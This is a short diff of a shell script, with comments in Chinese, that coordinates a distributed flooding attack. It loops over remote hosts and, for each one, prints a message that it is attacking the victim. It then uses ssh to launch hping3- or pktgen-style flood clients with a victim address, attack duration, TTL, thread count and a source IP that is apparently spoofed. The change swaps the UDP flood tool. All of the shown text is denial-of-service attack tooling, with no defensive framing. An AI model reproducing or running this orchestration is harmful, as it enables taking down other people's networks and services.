@@ -37,7 +37,7 @@ do
 			echo -e "正在攻击 $victim\n"
 			if [ $mode = "udp" ]
 			then
-    				ssh ${HOSTS[k]} pktgen-client $victim $attack_time $ttl $thread $source_ip &
+    				ssh ${HOSTS[k]} hping3u-client $victim $attack_time $ttl $thread $source_ip &
 			else
     				ssh ${HOSTS[k]} hping3-client $victim $attack_time $ttl $thread $source_ip &
 #    			echo "ssh ${HOSTS[k]} hping3-client $victim $attack_time $ttl $thread $source_ip &"
